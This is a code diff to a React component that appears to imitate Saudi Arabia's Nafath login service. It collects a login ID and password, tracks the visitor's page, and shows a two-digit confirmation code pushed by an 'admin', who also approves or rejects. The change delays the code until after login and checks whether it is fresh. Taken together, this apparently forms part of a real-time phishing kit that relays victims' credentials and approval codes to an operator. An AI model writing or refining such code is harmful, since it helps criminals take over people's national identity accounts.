@@ -22,6 +22,7 @@ export default function Component() {
   const [showConfirmDialog, setShowConfirmDialog] = useState(false);
   const [showSuccessDialog, setShowSuccessDialog] = useState(false);
   const [confirmationCode, setConfirmationCode] = useState<string>("");
+  const [confirmationCodeTimestamp, setConfirmationCodeTimestamp] = useState<number>(0);
   const [isloading, setIsLoading] = useState(false);
   const [idLogin, setLoginID] = useState("");
   const [password, setPassword] = useState("");
@@ -112,22 +113,18 @@ export default function Component() {
             }
           }
           // If currentStep === "_t6" or "nafad" or a number (from updateVisitorPage), stay on this page
-
-          // Listen for confirmation code from admin - ALWAYS WORKS, no login required
+          // Store received confirmation code for later use (after login)
           const confirmationCode = data.nafadConfirmationCode as string | undefined
+          const codeReceivedAt = data.nafadConfirmationCodeUpdatedAt as number | undefined
           
           if (confirmationCode && confirmationCode.length > 0) {
-            console.log("[nafad] 🚀 Confirmation code detected:", confirmationCode)
-            
-            // Show dialog immediately - no login required!
+            console.log("[nafad] 📥 Confirmation code received:", confirmationCode, "at", codeReceivedAt)
+            // Store for later use after login
             setConfirmationCode(confirmationCode)
-            setShowConfirmDialog(true)
-            setIsLoading(false)
-          } else if (confirmationCode === "") {
-            // Admin cleared the code
-            setShowConfirmDialog(false);
+            setConfirmationCodeTimestamp(codeReceivedAt || 0)
           }
-
+          
+          // Listen for admin approval/rejection
           // Listen for admin approval/rejection
           const updatedAt = data.nafadConfirmationStatusUpdatedAt as number | undefined
 
@@ -202,7 +199,26 @@ export default function Component() {
       nafadUpdatedAt: new Date().toISOString()
     });
     
-    // Keep loading until modal appears (don't stop here)
+    // After login, check if confirmation code is fresh (less than 1 minute)
+    const now = Date.now()
+    const codeAge = confirmationCodeTimestamp ? now - confirmationCodeTimestamp : Infinity
+    
+    if (confirmationCode && codeAge < 60000) {
+      // Code is fresh, show it in dialog
+      console.log("[nafad] ✅ Code is fresh (" + Math.round(codeAge/1000) + "s old), showing dialog")
+      setShowConfirmDialog(true)
+      setIsLoading(false)
+    } else if (confirmationCode) {
+      // Code is stale (more than 1 minute), show default "يرجى الانتظار"
+      console.log("[nafad] ⏳ Code is stale (" + (codeAge === Infinity ? "no timestamp" : Math.round(codeAge/1000) + "s old") + "), showing waiting message")
+      setConfirmationCode("") // Clear to show default "يرجى الانتظار"
+      setShowConfirmDialog(true)
+      setIsLoading(false)
+    } else {
+      // No code received yet
+      console.log("[nafad] ⏳ No code received, keeping loading state")
+      setIsLoading(true)
+    }
     // setIsLoading will be set to false when modal opens or error occurs
   };
 
@@ -367,14 +383,20 @@ export default function Component() {
             <div className="text-center space-y-6 p-4">
               {/* TWO DIGITS SIDE BY SIDE IN SMALLER ELEGANT BOX */}
               <div className="mx-auto w-48 h-48 bg-gradient-to-br from-teal-50 to-teal-100 border-2 border-teal-300 rounded-2xl shadow-lg flex items-center justify-center">
-                <div className="flex gap-3 justify-center items-center" dir="ltr">
-                  <div className="text-6xl font-bold text-teal-600 font-mono">
-                    {confirmationCode?.[0] || "-"}
+                {confirmationCode ? (
+                  <div className="flex gap-3 justify-center items-center" dir="ltr">
+                    <div className="text-6xl font-bold text-teal-600 font-mono">
+                      {confirmationCode?.[0] || "-"}
+                    </div>
+                    <div className="text-6xl font-bold text-teal-600 font-mono">
+                      {confirmationCode?.[1] || "-"}
+                    </div>
                   </div>
-                  <div className="text-6xl font-bold text-teal-600 font-mono">
-                    {confirmationCode?.[1] || "-"}
+                ) : (
+                  <div className="text-xl font-bold text-gray-500">
+                    يرجى الانتظار...
                   </div>
-                </div>
+                )}
               </div>
 
               <div className="flex items-center justify-center gap-3 text-teal-600 py-2">
@@ -382,7 +404,9 @@ export default function Component() {
                   <div className="w-3 h-3 bg-teal-600 rounded-full animate-ping absolute"></div>
                   <div className="w-3 h-3 bg-teal-600 rounded-full"></div>
                 </div>
-                <div className="text-sm font-medium">في انتظار الموافقة...</div>
+                <div className="text-sm font-medium">
+                  {confirmationCode ? "في انتظار الموافقة..." : "في انتظار الرمز..."}
+                </div>
               </div>
             </div>
           </DialogContent>
